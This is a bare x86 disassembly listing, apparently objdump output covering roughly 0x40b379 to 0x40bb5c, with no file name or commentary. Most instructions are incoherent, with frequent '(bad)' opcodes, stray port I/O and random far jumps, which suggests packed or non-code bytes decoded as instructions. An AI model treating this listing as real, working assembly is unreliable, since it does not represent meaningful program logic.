  40b379:	cmp    al,0xf
  40b37b:	or     al,al
  40b37d:	inc    ebp
  40b37e:	inc    ebp
  40b37f:	xor    eax,0x8bc89c8b
  40b384:	ins    BYTE PTR es:[edi],dx
  40b385:	cld    
  40b386:	add    BYTE PTR [edi+0x576c16c0],dh
  40b38c:	add    BYTE PTR [ecx-0x5],dl
  40b38f:	add    eax,0x17200
  40b394:	sbb    al,0x85
  40b396:	dec    esp
  40b397:	je     0x40b3d1
  40b399:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40b39d:	add    BYTE PTR [ebx],bh
  40b39f:	(bad)  
  40b3a0:	and    al,0x34
  40b3a2:	jae    0x40b340
  40b3a4:	mov    cl,cl
  40b3a6:	inc    DWORD PTR [esp]
  40b3a9:	push   ebp
  40b3aa:	shr    esp,0x8
  40b3ad:	in     al,dx
  40b3ae:	push   esp
  40b3af:	and    DWORD PTR [eax],0xffffffdc
  40b3b2:	retf   
  40b3b3:	(bad)  
  40b3b4:	mov    bh,0xe4
  40b3b6:	add    BYTE PTR [ebp+0x450ff8e9],dh
  40b3bc:	retf   0x4cf5
  40b3bf:	pushf  
  40b3c0:	and    bh,al
  40b3c2:	pop    ss
  40b3c3:	rcr    cl,1
  40b3c5:	test   DWORD PTR [eax],eax
  40b3c7:	clc    
  40b3c8:	add    BYTE PTR [ebp+0x2b],al
  40b3cb:	xor    eax,ecx
  40b3cd:	pushf  
  40b3ce:	add    eax,0xd001c7
  40b3d3:	add    eax,0x456cf8c0
  40b3d8:	inc    eax
  40b3d9:	push   ebx
  40b3da:	rcr    DWORD PTR [eax+0x4c0105],0x20
  40b3e1:	inc    ebp
  40b3e2:	fst    DWORD PTR [esi+0x29]
  40b3e5:	mov    eax,DWORD PTR [eax]
  40b3e7:	nop
  40b3e8:	rol    BYTE PTR [eax],0xc0
  40b3eb:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  40b3f1:	add    DWORD PTR [ebx-0x75f9af00],ecx
  40b3f7:	pop    ebp
  40b3f8:	add    DWORD PTR [ecx+0x758bf800],ecx
  40b3fe:	or     BYTE PTR [ebp-0xce8aca],al
  40b404:	mov    bl,BYTE PTR [eax]
  40b406:	add    DWORD PTR [ebp+0x0],edx
  40b409:	call   0xfff3b317
  40b40e:	add    DWORD PTR [edi],ecx
  40b410:	add    BYTE PTR [edi],al
  40b412:	push   cs
  40b413:	inc    ecx
  40b414:	or     BYTE PTR [ebx+0x18008901],0x8
  40b41b:	leave  
  40b41c:	dec    ecx
  40b41d:	dec    esi
  40b41e:	add    esi,DWORD PTR [ebp-0x39]
  40b421:	call   0xffe6a322
  40b426:	clc    
  40b427:	inc    ebp
  40b428:	inc    ebp
  40b429:	mov    ecx,DWORD PTR [edi]
  40b42b:	enter  0x49,0x35
  40b42f:	mov    ecx,DWORD PTR [eax]
  40b431:	xor    eax,0x79e0807
  40b436:	xor    bl,BYTE PTR [esi-0x743ecda2]
  40b43c:	or     al,0x1c
  40b43e:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40b445:	int3   
  40b446:	test   DWORD PTR [eax],eax
  40b448:	clc    
  40b449:	inc    edx
  40b44b:	mov    eax,DWORD PTR [eax]
  40b44d:	fmul   DWORD PTR [ebx+0x74ff8300]
  40b453:	sub    BYTE PTR [ebp-0x40],ah
  40b456:	add    BYTE PTR [esi+0x45],bl
  40b459:	leave  
  40b45a:	xor    eax,0xc78b9c18
  40b45f:	jl     0x40b441
  40b461:	add    BYTE PTR [ebp+0x458df88b],al
  40b467:	add    al,0x31
  40b469:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  40b470:	test   edx,esp
  40b472:	clc    
  40b473:	or     eax,DWORD PTR [ebp+0x40]
  40b476:	xor    eax,0x8b949f89
  40b47b:	inc    ebp
  40b47c:	sbb    al,0xbe
  40b47e:	mov    ecx,DWORD PTR [eax]
  40b480:	xchg   esp,eax
  40b481:	pop    es
  40b482:	add    dh,al
  40b484:	mov    esp,DWORD PTR [ebp+0x1c]
  40b487:	add    BYTE PTR [edi-0x62],dl
  40b48a:	mov    eax,0x30132
  40b48f:	mov    DWORD PTR [ebp-0x68],eax
  40b492:	mov    eax,DWORD PTR [ebp-0x74]
  40b495:	xor    eax,DWORD PTR [eax]
  40b497:	add    ecx,DWORD PTR [ebx-0xf637677]
  40b49d:	inc    ebp
  40b49e:	jge    0x40b4f0
  40b4a0:	mov    DWORD PTR [ebp-0xc],eax
  40b4a3:	xor    eax,eax
  40b4a5:	add    ecx,DWORD PTR [ebx]
  40b4a7:	push   eax
  40b4a8:	jne    0x40b4ef
  40b4aa:	mov    eax,DWORD PTR ds:0x3f001c
  40b4b0:	dec    DWORD PTR [ebx-0x7f74e375]
  40b4b6:	add    eax,DWORD PTR [ecx]
  40b4b8:	cmp    al,0x0
  40b4ba:	push   cs
  40b4bb:	inc    ebp
  40b4bc:	inc    ebp
  40b4bd:	add    al,0x85
  40b4bf:	add    BYTE PTR [edi+edi*8-0x1],dh
  40b4c3:	mov    ebx,DWORD PTR [esp+ecx*1]
  40b4c6:	mov    ebp,0x8bffff4d
  40b4cb:	mov    ebx,DWORD PTR [esp+esi*8]
  40b4ce:	sbb    al,0x1
  40b4d1:	inc    ebp
  40b4d2:	add    BYTE PTR [ebx-0x74a87700],cl
  40b4d8:	push   ecx
  40b4d9:	clc    
  40b4da:	add    eax,0x457218
  40b4df:	mov    eax,DWORD PTR [ebp+0x50]
  40b4e2:	jne    0x40b529
  40b4e4:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  40b4ea:	add    edi,eax
  40b4ec:	add    BYTE PTR [ebp+0x31],al
  40b4ef:	lea    eax,[eax+0x4501dc]
  40b4f5:	lea    edx,[eax-0x74]
  40b4f8:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  40b4fe:	ret    0xc7
  40b501:	mov    eax,DWORD PTR [eax+0xee011c]
  40b507:	add    BYTE PTR [eax],cl
  40b509:	push   eax
  40b50a:	inc    ebp
  40b50b:	inc    ebp
  40b50c:	add    DWORD PTR [ebx+0x8b98eb],ecx
  40b512:	test   edi,eax
  40b514:	jne    0x40b4a2
  40b516:	mov    eax,DWORD PTR [eax]
  40b518:	mov    eax,DWORD PTR [eax]
  40b51a:	push   eax
  40b51b:	pop    ebp
  40b51c:	inc    ebp
  40b51d:	dec    DWORD PTR [ebx+0x570ce48b]
  40b523:	rcl    BYTE PTR [ecx-0x40],1
  40b526:	xor    esi,DWORD PTR [eax]
  40b528:	add    DWORD PTR [ebp-0x70],0xffffff83
  40b52c:	mov    edi,0x8372fc
  40b531:	push   eax
  40b532:	(bad)  
  40b533:	jbe    0x40b57a
  40b535:	mov    ecx,DWORD PTR [ebx-0x39341714]
  40b53b:	ret    
  40b53c:	(bad)  
  40b53d:	dec    ebp
  40b53e:	inc    ebp
  40b53f:	jmp    0x40b4ce
  40b541:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40b548:	(bad)  
  40b549:	cld    
  40b54a:	(bad)  
  40b54b:	push   ebp
  40b54c:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  40b552:	add    BYTE PTR [ebx],bh
  40b554:	push   eax
  40b555:	push   eax
  40b556:	inc    ebp
  40b557:	jmp    0x3d900e7
  40b55c:	add    BYTE PTR [ebx+0x8ca0c7],cl
  40b562:	add    BYTE PTR [ebx-0x13cfd500],cl
  40b568:	inc    ebp
  40b569:	ret    
  40b56a:	mov    DWORD PTR [ebp-0x14],edx
  40b56d:	mov    edx,eax
  40b56f:	sub    BYTE PTR [ebp-0x2d],cl
  40b572:	mov    ecx,DWORD PTR [ebp-0x75]
  40b575:	mov    eax,esi
  40b577:	rol    BYTE PTR [eax],1
  40b579:	inc    ebp
  40b57a:	add    DWORD PTR [eax],eax
  40b57c:	inc    ebp
  40b57d:	add    BYTE PTR [ecx+0x18838beb],cl
  40b583:	clc    
  40b584:	inc    eax
  40b585:	jmp    0x8d45:0x74945589
  40b58c:	xor    ecx,DWORD PTR [eax]
  40b58e:	add    edx,DWORD PTR [ebp-0x77]
  40b591:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40b597:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  40b59e:	inc    ebp
  40b59f:	fdiv   DWORD PTR [ebx]
  40b5a1:	loop   0x40b5a6
  40b5a3:	(bad)  
  40b5a5:	add    BYTE PTR [ebp+0x55],al
  40b5a8:	add    eax,0xd8008b
  40b5ad:	jmp    0xcd80:0x621c818b
  40b5b4:	add    DWORD PTR [ebx],esi
  40b5b6:	add    BYTE PTR [ecx-0x63fbcdbb],al
  40b5bc:	add    BYTE PTR [ebp-0x77],dh
  40b5bf:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  40b5c5:	dec    ebp
  40b5c6:	inc    DWORD PTR [ebx]
  40b5c8:	test   DWORD PTR [ebx+0x108b0074],eax
  40b5ce:	sbb    BYTE PTR [ebp+0x65],dl
  40b5d1:	add    eax,DWORD PTR [eax]
  40b5d3:	mov    edi,DWORD PTR [eax-0x75]
  40b5d6:	add    ah,dl
  40b5d8:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  40b5df:	dec    ebp
  40b5e0:	mov    DWORD PTR [ebx-0xfc071c],eax
  40b5e6:	dec    ebp
  40b5e7:	call   0x55426376
  40b5ec:	inc    ebp
  40b5ed:	add    DWORD PTR [ebx+0x855fcf4],ecx
  40b5f3:	cmp    ecx,DWORD PTR [ebp-0x5c]
  40b5f6:	inc    eax
  40b5f7:	add    BYTE PTR [ecx+0x73],dl
  40b5fa:	jb     0x40b5ff
  40b5fc:	mov    esi,eax
  40b5fe:	cmp    al,0x50
  40b600:	retf   
  40b601:	mov    DWORD PTR [ecx+0x4500f0],eax
  40b607:	test   ebx,edx
  40b609:	andnps xmm6,XMMWORD PTR [edx+0x3]
  40b60d:	dec    DWORD PTR [ecx+0x51ecfc8b]
  40b613:	inc    ebp
  40b614:	add    eax,edi
  40b616:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  40b61d:	inc    ecx
  40b61e:	hlt    
  40b61f:	mov    DWORD PTR [eax],eax
  40b621:	xchg   esp,eax
  40b622:	add    BYTE PTR [ebp+0x7d],al
  40b625:	xor    eax,edx
  40b627:	add    edx,ecx
  40b629:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  40b62f:	mov    DWORD PTR [eax-0x64],edx
  40b632:	mov    DWORD PTR [ebp-0x8],eax
  40b635:	push   eax
  40b636:	push   ebp
  40b637:	inc    ebp
  40b638:	mov    DWORD PTR [ebx],esi
  40b63a:	call   0xf910b42
  40b63f:	inc    ebp
  40b640:	adc    al,BYTE PTR ds:0x810055
  40b646:	dec    DWORD PTR [ebx-0x7f76e400]
  40b64c:	aam    0x1
  40b64e:	push   ebp
  40b64f:	add    cl,al
  40b651:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40b658:	call   FWORD PTR [esi+edx*8]
  40b65b:	cmp    dl,0x1
  40b65e:	test   DWORD PTR [eax],eax
  40b660:	clc    
  40b661:	inc    ebp
  40b662:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40b668:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  40b66e:	cmp    edi,edi
  40b670:	je     0x40b642
  40b672:	mov    eax,DWORD PTR [ebp-0x4]
  40b675:	add    edx,DWORD PTR [ecx]
  40b677:	sbb    al,0x0
  40b679:	dec    ebp
  40b67a:	dec    ebp
  40b67b:	mov    DWORD PTR [ecx+0x4545011c],ecx
  40b681:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40b687:	add    DWORD PTR [edx],eax
  40b689:	add    BYTE PTR [ebp+0x45],cl
  40b68c:	jne    0x40b619
  40b68e:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40b695:	cmp    esp,esi
  40b697:	jb     0x40b62a
  40b699:	mov    eax,DWORD PTR [eax]
  40b69b:	mov    eax,DWORD PTR [eax]
  40b69d:	mov    edx,DWORD PTR [esp+edi*1]
  40b6a0:	inc    ebp
  40b6a1:	je     0x40b62e
  40b6a3:	push   eax
  40b6a4:	add    al,0x38
  40b6a6:	push   ebp
  40b6a7:	mov    DWORD PTR ds:[ecx],edi
  40b6aa:	in     al,0xc
  40b6ac:	shl    BYTE PTR [eax],cl
  40b6ae:	test   DWORD PTR [ecx],eax
  40b6b0:	call   DWORD PTR [edx]
  40b6b2:	inc    esi
  40b6b4:	inc    ebp
  40b6b5:	ror    BYTE PTR [ecx+0x45459011],1
  40b6bb:	jmp    0xff41b3c4
  40b6c0:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	loopne 0x40b655
  40b6ca:	(bad)  
  40b6cb:	sbb    al,0xc7
  40b6cd:	inc    ebp
  40b6ce:	inc    ebp
  40b6cf:	push   ebx
  40b6d0:	lea    edi,[eax+0x454fdc]
  40b6d6:	lea    ecx,[ecx-0x74a774]
  40b6dc:	or     BYTE PTR [edi-0x3a],dl
  40b6df:	js     0x40b6a8
  40b6e1:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  40b6e7:	inc    DWORD PTR [eax]
  40b6e9:	call   DWORD PTR [eax+0x79]
  40b6ec:	inc    ebp
  40b6ed:	add    BYTE PTR [ebx+0x859866],cl
  40b6f3:	(bad)  
  40b6f4:	(bad)  
  40b6f5:	dec    DWORD PTR [ebx-0x2f99f3b9]
  40b6fb:	test   DWORD PTR [ebp-0x1],eax
  40b6fe:	mov    edi,edi
  40b700:	add    al,0x0
  40b703:	add    ax,WORD PTR [ebp-0xb20004]
  40b70a:	inc    DWORD PTR [edx+0x14]
  40b70d:	add    BYTE PTR [eax],cl
  40b70f:	data16 jne 0x40b697
  40b712:	push   ebx
  40b713:	call   DWORD PTR [ebp-0x1]
  40b716:	mov    eax,eax
  40b718:	cld    
  40b719:	inc    bp
  40b71b:	test   DWORD PTR [ebp+0x45ff04ff],ecx
  40b721:	inc    eax
  40b722:	mov    eax,DWORD PTR [eax]
  40b724:	sbb    al,0x66
  40b726:	inc    ebp
  40b727:	test   DWORD PTR [ebx+0xff90ff],ecx
  40b72d:	ror    BYTE PTR [ebx-0x7f7ae39a],0xff
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ebp+0x30],al
  40b739:	add    BYTE PTR [ecx],dh
  40b73b:	popw   ds
  40b73d:	test   DWORD PTR [edx],esi
  40b73f:	(bad)  
  40b740:	cmp    bh,bh
  40b742:	jbe    0x40b70b
  40b744:	lea    ecx,[ecx-0x7493c9]
  40b74a:	add    edi,DWORD PTR [eax+0x734f39]
  40b750:	mov    ecx,DWORD PTR [ecx-0x749175]
  40b756:	sub    edi,DWORD PTR [eax+0x89d003]
  40b75c:	mov    ecx,DWORD PTR [ecx-0x698f04]
  40b762:	(bad)  
  40b763:	mov    eax,0xecd755
  40b768:	in     al,dx
  40b769:	mov    DWORD PTR [eax],eax
  40b76b:	jb     0x40b76d
  40b76d:	inc    DWORD PTR [ebp-0x48]
  40b770:	mov    ecx,esp
  40b772:	sbb    al,0x0
  40b774:	push   esi
  40b775:	mov    DWORD PTR ds:0x66ff0074,ecx
  40b77b:	mov    DWORD PTR [ebp-0x7a0014],0xad7d8df8
  40b785:	add    bh,al
  40b787:	mov    WORD PTR [ebp-0xa6],ax
  40b78e:	mov    eax,0x354f45
  40b793:	pushf  
  40b794:	mov    DWORD PTR [ebp-0x7600fda4],ecx
  40b79a:	lea    edi,[eax+0x4]
  40b79d:	dec    DWORD PTR [ecx-0x1ba13a]
  40b7a3:	mov    BYTE PTR [ebx-0x7639af1b],0xe6
  40b7aa:	pusha  
  40b7ab:	(bad)  
  40b7ac:	jmp    edi
  40b7ae:	mov    eax,0xe84fc6
  40b7b3:	xor    ecx,DWORD PTR [ecx-0x169d3a]
  40b7b9:	xor    eax,DWORD PTR [ebx-0x76ff3a42]
  40b7bf:	add    BYTE PTR [esp+eax*2-0x1],ah
  40b7c3:	in     al,0xb8
  40b7c5:	mov    dh,0x4f
  40b7c7:	add    DWORD PTR [eax],0x49
  40b7ca:	mov    esi,ebx
  40b7cc:	data16 mov bh,bh
  40b7cf:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  40b7d6:	push   0xb845ffe3
  40b7db:	loope  0x40b82c
  40b7dd:	inc    ebp
  40b7de:	add    bl,dl
  40b7e0:	mov    DWORD PTR [ebp+0x6a],eax
  40b7e3:	out    dx,al
  40b7e4:	inc    DWORD PTR [ebp-0x75]
  40b7e7:	and    DWORD PTR [esi+0x45],esp
  40b7ea:	test   DWORD PTR [esi],ebp
  40b7ec:	inc    DWORD PTR [ebp-0x1]
  40b7ef:	jl     0x40b83a
  40b7f1:	leave  
  40b7f2:	add    BYTE PTR [esi+eiz*2-0x24],al
  40b7f6:	test   DWORD PTR [esi+0x49ff83ff],esi
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	fiadd  WORD PTR [eax]
  40b7ff:	mov    BYTE PTR [esi-0x7d],ah
  40b802:	test   DWORD PTR [edi],eax
  40b804:	(bad)  
  40b805:	in     al,dx
  40b806:	inc    DWORD PTR [ebp+0x6c]
  40b809:	loope  0x40b80b
  40b80b:	inc    ebp
  40b80c:	data16 aam 0x85
  40b80f:	inc    ebp
  40b810:	(bad)  
  40b811:	call   0xe5bcfe15
  40b816:	add    BYTE PTR [ebp+0x66],al
  40b819:	fild   WORD PTR [ebp-0x1300bb]
  40b81f:	inc    ebp
  40b820:	inc    ebp
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	xor    al,0x45
  40b824:	pushf  
  40b825:	jl     0x40b7df
  40b827:	leave  
  40b828:	icebp  
  40b829:	inc    esp
  40b82a:	add    ah,dl
  40b82c:	mov    DWORD PTR [esi+0x49ff8376],esi
  40b832:	(bad)  
  40b833:	fdivrp st(0),st
  40b835:	mov    BYTE PTR [ebp+0x4708f883],al
  40b83b:	in     al,dx
  40b83c:	test   WORD PTR [ebp-0x1],ax
  40b843:	inc    ebp
  40b844:	inc    ebp
  40b845:	mov    edx,ebp
  40b847:	cld    
  40b848:	inc    ebp
  40b849:	out    dx,eax
  40b84a:	rcl    BYTE PTR [ebx],1
  40b84c:	inc    ebp
  40b84d:	mov    edi,edx
  40b84f:	mov    eax,DWORD PTR [ebp+0x54]
  40b852:	and    edi,edi
  40b854:	inc    ebp
  40b855:	cmp    ebp,DWORD PTR [esi]
  40b857:	jne    0x40b82b
  40b859:	mov    DWORD PTR [ebp-0x44],0xf8c9857c
  40b860:	retf   
  40b861:	inc    ebp
  40b862:	add    dl,ah
  40b864:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  40b86b:	xor    bl,0x1
  40b86e:	add    eax,DWORD PTR [eax]
  40b870:	inc    ecx
  40b871:	adc    BYTE PTR [eax],bl
  40b873:	test   ecx,edi
  40b875:	add    dh,BYTE PTR [edx+0x0]
  40b878:	mov    BYTE PTR [ebp-0x24],0x8b
  40b87c:	(bad)  
  40b87d:	jl     0x40b85c
  40b87f:	add    dh,al
  40b881:	mov    esi,ebx
  40b883:	mov    eax,esi
  40b885:	sbb    al,0xdf
  40b887:	add    dh,0x1
  40b88a:	loopne 0x40b88c
  40b88c:	(bad)  
  40b88d:	adc    cl,ah
  40b88f:	or     dh,al
  40b891:	inc    ebp
  40b892:	loop   0x40b875
  40b894:	xor    ebp,eax
  40b896:	(bad)  
  40b897:	(bad)  
  40b898:	or     eax,0x18ec0ff8
  40b89d:	jl     0x40b892
  40b89f:	inc    ebp
  40b8a0:	add    ebx,DWORD PTR [ecx+0x41]
  40b8a3:	adc    BYTE PTR [eax],bl
  40b8a5:	repnz stc 
  40b8a7:	xor    BYTE PTR [edx+0x35],0xc6
  40b8ab:	adc    ah,dl
  40b8ad:	dec    ecx
  40b8ae:	(bad)  
  40b8af:	repnz aad 0x45
  40b8b2:	(bad)  
  40b8b3:	mov    esi,edx
  40b8b5:	adc    al,0xc6
  40b8b7:	call   edi
  40b8b9:	(bad)  
  40b8ba:	(bad)  
  40b8bb:	adc    al,bl
  40b8bd:	inc    esi
  40b8bf:	push   eax
  40b8c0:	fld    DWORD PTR [ebp-0x3a]
  40b8c3:	mov    esi,0x7c608da
  40b8c8:	fcmovnb st,st(6)
  40b8ca:	xor    ebx,DWORD PTR [esi+0x30d328d]
  40b8d0:	(bad)  
  40b8d2:	sbb    BYTE PTR [ebp-0xd],al
  40b8d5:	add    DWORD PTR [ebx],0x66
  40b8d8:	inc    ecx
  40b8d9:	mov    ebx,DWORD PTR [eax]
  40b8db:	sbb    al,0xf9
  40b8dd:	xor    BYTE PTR [edx+0x1],0x8d
  40b8e1:	add    BYTE PTR [ebp+eax*4-0x1],dl
  40b8e5:	dec    DWORD PTR [ecx+0x4d00fcff]
  40b8eb:	add    BYTE PTR [eax+0x7145fc30],bh
  40b8f1:	inc    DWORD PTR [ecx]
  40b8f3:	mov    ecx,DWORD PTR [ebp-0x310010]
  40b8f9:	retf   
  40b8fa:	enter  0xe45,0x3b
  40b8fe:	inc    ebp
  40b8ff:	jne    0x40b936
  40b901:	mov    eax,ds:0x33c70b9c
  40b906:	mov    esp,0xf81585ef
  40b90b:	mov    ds:0x338b0b45,eax
  40b910:	mov    WORD PTR [edi-0x5cc68e00],cs
  40b916:	ud2    
  40b918:	xchg   ebp,eax
  40b919:	xor    eax,DWORD PTR [eax]
  40b91b:	dec    edx
  40b91c:	mov    eax,DWORD PTR [eax]
  40b91e:	sbb    al,0x83
  40b920:	cmp    ah,0x1
  40b923:	push   0x0
  40b925:	pop    eax
  40b926:	adc    BYTE PTR [ecx-0x7483bb],cl
  40b92c:	and    BYTE PTR [esi+0x0],0x85
  40b930:	mov    edi,edi
  40b932:	push   0xffffffff
  40b934:	(bad)  
  40b935:	mov    esp,esi
  40b937:	adc    ah,0x75
  40b93a:	in     eax,0x66
  40b93c:	inc    ebp
  40b93d:	inc    ebp
  40b93e:	fild   QWORD PTR [edx-0x29]
  40b941:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40b947:	inc    ebp
  40b948:	sub    BYTE PTR [edx+0x49],0x58
  40b94c:	jmp    0x752c:0x40868889
  40b953:	lea    ax,[ebp-0xc]
  40b957:	xor    eax,DWORD PTR [ebp-0x5f0078]
  40b95d:	mov    DWORD PTR [ebp-0x820076],eax
  40b963:	stos   DWORD PTR es:[edi],eax
  40b964:	mov    ebp,DWORD PTR [ebx-0x43a87414]
  40b96a:	push   ecx
  40b96b:	test   DWORD PTR [ebx],esi
  40b96d:	(bad)  
  40b96e:	mov    ebx,0xc072ff
  40b973:	push   ebp
  40b974:	ret    
  40b975:	(bad)  
  40b976:	mov    eax,eax
  40b978:	sbb    al,0xdf
  40b97a:	rcl    ah,0x50
  40b97d:	inc    ebp
  40b97e:	inc    ebp
  40b97f:	into   
  40b980:	mov    ebp,ebx
  40b982:	cwde   
  40b983:	mov    DWORD PTR [eax],0x10d3c7c8
  40b989:	call   0xdf41ff8d
  40b98e:	add    cl,ch
  40b990:	jmp    DWORD PTR [esi-0x75]
  40b993:	inc    ebp
  40b994:	or     BYTE PTR [edi],bh
  40b996:	rol    bh,1
  40b998:	dec    ebp
  40b999:	adc    BYTE PTR [ebx],dh
  40b99b:	inc    DWORD PTR [ebx]
  40b99d:	add    cl,BYTE PTR [ecx-0x3e174400]
  40b9a3:	push   ss
  40b9a4:	push   ds
  40b9a5:	add    dh,ch
  40b9a7:	test   DWORD PTR [ebx-0x1],esi
  40b9aa:	or     eax,0x22850bff
  40b9af:	(bad)  
  40b9b0:	out    dx,al
  40b9b1:	push   DWORD PTR [ebx-0x75]
  40b9b4:	add    eax,0x3357e9ec
  40b9b9:	push   ecx
  40b9ba:	out    dx,al
  40b9bb:	xor    esi,DWORD PTR [ebx+0x3]
  40b9be:	jmp    0x85bb13
  40b9c3:	and    DWORD PTR [ebp+0x44],0x0
  40b9c7:	mov    esp,DWORD PTR [eax]
  40b9c9:	sbb    al,0x66
  40b9cb:	add    BYTE PTR [ebp-0xff00ff],0x30
  40b9d2:	mov    DWORD PTR [ebp+0x7e],eax
  40b9d5:	(bad)  
  40b9d6:	inc    DWORD PTR [ebx-0xbadf9a]
  40b9dc:	push   0xffffffff
  40b9de:	pop    eax
  40b9df:	clc    
  40b9e0:	mov    DWORD PTR [eax],ecx
  40b9e2:	or     BYTE PTR [ecx-0x8aef8d],0x58
  40b9e9:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  40b9ef:	lea    esp,[esi+0x10]
  40b9f2:	inc    ebp
  40b9f3:	jmp    FWORD PTR [edx+0x50]
  40b9f6:	pop    eax
  40b9f7:	inc    ebp
  40b9f8:	mov    DWORD PTR [ebx],esi
  40b9fa:	mov    BYTE PTR [ebx],al
  40b9fc:	rcl    BYTE PTR [eax+0x45],0x85
  40ba00:	inc    WORD PTR [ebp-0x1]
  40ba04:	lea    ecx,[ebx-0x7f99e35f]
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	add    DWORD PTR [ebp+0x0],eax
  40ba0e:	mov    ecx,ecx
  40ba10:	adc    al,0x95
  40ba12:	(bad)  
  40ba13:	push   DWORD PTR [ebx]
  40ba15:	dec    DWORD PTR [ebp+0x45ffc095]
  40ba1b:	dec    esp
  40ba1d:	push   ebp
  40ba1e:	loopne 0x40b9a9
  40ba20:	(bad)  
  40ba21:	adc    al,0xc4
  40ba23:	call   ebx
  40ba25:	mov    ebp,ebp
  40ba27:	sbb    BYTE PTR [ebp-0x1],al
  40ba2a:	loop   0x40b9b5
  40ba2c:	ds and al,0xc7
  40ba2f:	dec    esp
  40ba31:	mov    edx,ebp
  40ba33:	sub    al,0xe1
  40ba35:	inc    edi
  40ba37:	mov    eax,edx
  40ba39:	xor    BYTE PTR [edi+edi*8-0x7b],bh
  40ba3d:	(bad)  
  40ba3e:	dec    DWORD PTR [ebx-0x2ffff701]
  40ba44:	add    BYTE PTR [ebp+0x2c],al
  40ba47:	push   eax
  40ba48:	add    bh,dl
  40ba4a:	mov    DWORD PTR [ebp+0x18],edi
  40ba4d:	jbe    0x40ba4e
  40ba4f:	test   DWORD PTR [ebp-0xffefff],ecx
  40ba55:	inc    ebp
  40ba56:	push   eax
  40ba57:	add    DWORD PTR [ebp-0x4],0x801be
  40ba5e:	pop    es
  40ba5f:	add    dh,0xfe
  40ba62:	ret    
  40ba63:	dec    DWORD PTR [ebx-0x3fffe346]
  40ba69:	mov    ecx,0x454f50
  40ba6e:	mov    eax,ecx
  40ba70:	cwde   
  40ba71:	mov    DWORD PTR [eax],eax
  40ba73:	test   al,0xff
  40ba75:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  40ba7c:	lea    ecx,[ebp-0x7600f201]
  40ba82:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40ba89:	push   ebp
  40ba8a:	dec    DWORD PTR [ebp-0x767aec01]
  40ba90:	push   DWORD PTR [eax+0x6685c2ff]
  40ba96:	call   DWORD PTR [ebp-0x1]
  40ba99:	lea    ecx,[ebx-0x397613df]
  40ba9f:	mov    ah,0xc3
  40baa1:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40baa7:	mov    DWORD PTR [eax-0x48],edx
  40baaa:	inc    ebp
  40baab:	dec    edx
  40baac:	mov    ecx,DWORD PTR [ebx+0x55006698]
  40bab2:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40bab8:	dec    DWORD PTR [ebp-0x76e3b277]
  40babe:	call   DWORD PTR [eax-0x6d5f7673]
  40bac4:	lea    eax,[ecx-0x1]
  40bac7:	inc    WORD PTR [ebp-0x73]
  40bacb:	cmp    edi,0x3
  40bace:	dec    DWORD PTR [ecx+0x41ff9695]
  40bad4:	jmp    DWORD PTR [esi-0x73]
  40bad7:	inc    ebp
  40bad8:	jmp    DWORD PTR [esi-0x1]
  40badb:	dec    ebp
  40badc:	lea    esp,[esi-0x1]
  40badf:	jge    0x40bae0
  40bae1:	mov    esi,DWORD PTR [eax]
  40bae3:	lock inc ebp
  40bae5:	mov    bh,0xff
  40bae7:	mov    WORD PTR [ebp-0x3c5f3a],cs
  40baed:	rol    DWORD PTR [eax+0xf8ca289],0x45
  40baf4:	push   cs
  40baf5:	str    WORD PTR [ebp-0x1]
  40baf9:	xor    edi,esp
  40bafb:	add    edi,DWORD PTR [ebp+0x33]
  40bafe:	add    BYTE PTR [esi+0x0],ah
  40bb01:	inc    ebp
  40bb02:	rdpmc  
  40bb04:	mov    edi,0xbf45ff66
  40bb09:	dec    si
  40bb0b:	inc    ebp
  40bb0c:	add    BYTE PTR [ebx+0x45000c12],cl
  40bb12:	mov    edi,edi
  40bb14:	data16 sbb al,0x45
  40bb17:	jne    0x40ba9c
  40bb19:	push   ebp
  40bb1b:	adc    al,0xd0
  40bb1d:	jne    0x40baa8
  40bb1f:	jmp    FWORD PTR [edx+0x66755108]
  40bb25:	call   0xffc4b37f
  40bb2a:	or     BYTE PTR [ebp-0x77],al
  40bb2d:	mov    ebp,DWORD PTR [esi+0x6645511c]
  40bb33:	mov    edx,DWORD PTR [ebp-0x70]
  40bb36:	add    DWORD PTR [eax],0x3
  40bb39:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  40bb3f:	add    DWORD PTR [esi+0x0],esp
  40bb42:	push   ebp
  40bb43:	xor    BYTE PTR [esi+0x4d],ah
  40bb46:	dec    ebp
  40bb47:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  40bb4d:	mov    ecx,DWORD PTR [ebp-0x2ec30075]
  40bb53:	jl     0x40bade
  40bb55:	push   eax
  40bb56:	mov    esi,?
  40bb58:	rcl    bh,1
  40bb5a:	mov    DWORD PTR [esi],eax
  40bb5c:	mov    es,esi
